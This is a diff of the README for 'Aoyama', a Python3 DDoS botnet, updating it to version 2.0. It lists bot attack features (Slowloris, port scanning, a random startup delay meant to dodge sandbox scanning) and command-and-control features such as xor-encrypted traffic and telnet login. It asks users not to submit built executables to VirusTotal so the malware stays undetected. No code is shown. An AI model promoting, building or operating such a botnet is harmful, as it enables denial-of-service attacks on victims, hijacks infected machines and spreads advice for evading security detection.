@@ -1,15 +1,19 @@
-# Aoyama ![](https://img.shields.io/badge/Version-1.1-brightgreen.svg)  ![](https://img.shields.io/badge/license-GPL2.0-green.svg)
+# Aoyama ![](https://img.shields.io/badge/Version-2.0-brightgreen.svg)  ![](https://img.shields.io/badge/license-GPL2.0-green.svg)
 Aoyama is a New version of Python3 botnet, old version: http://github.com/Leeon123/Python3-botnet
 
 Aoyama is for ddos(Maybe add more function later, such as...keylogger?)
+
+**And Now It's version 2.0**
 
 ***PLS Don't scan the executable file generated from pyinstaller or py2exe on any virus scanner(such as VirusTotal), if you want to keep using this project(i will continue update the code) and not be detected*** 
 
 **Plese run the cnc.py in linux, run in windows will have bug when login to cnc(idk why but i will try to fix it)**
 
-**Test video: https://www.youtube.com/watch?v=W4YR-cf3xD0**
+**Test video(OLD): https://www.youtube.com/watch?v=W4YR-cf3xD0**
 ## News&Features
-**BOT:**
+**BOT(V2):**
+- [x] **Added Port Scanner**
+- [x] Improved Code
 - [x] Added Slowloris attack
 - [x] Improved attack process
 - [x] Auto enable ssl when attack
@@ -19,13 +23,15 @@ Aoyama is for ddos(Maybe add more function later, such as...keylogger?)
 - [x] Added single instance mode
 - [x] Startup delay 30~90(random) seconds to bypass some sandbox scanning
 
-**CNC:**
+**CNC(V2):**
+- [x] Decrease delay of send command
+- [x] Support Telnet Login
 - [x] Encrypted traffic(xor)
 - [x] Coloured CNC
 - [x] Using login.txt to check account.(Need improve, sometime may have bugs)
 - [x] Keep-alive connection
 - [x] Using putty raw-mode login(on windows) and telnet(on linux)
-- [x] Using 'ping/pong' to check bot connection status(use 'scan' to check it by yourself or it checks every min.)
+- [x] Using 'ping/pong' to check bot connection status(use 'scan' to check it by yourself or it checks every **15 seconds**.)
 
 ## Opinion:
 In my opinion, best way is using **python v3.4.3** and **pyinstaller v3.2**. They are the best pattern i tested and used.
@@ -41,7 +47,7 @@ At Last, run the bot.py in any python3 environment(IDE, codeanywhere,etc.) or u 
 
 then the **Bot** is online.
 
-***To login cnc***, using **putty raw-mode** or telnet(**in linux**) to connect it then
+***To login cnc***, using **telnet(Updated after v2)** connect it then
 
 click enter key will show the login parameters
 
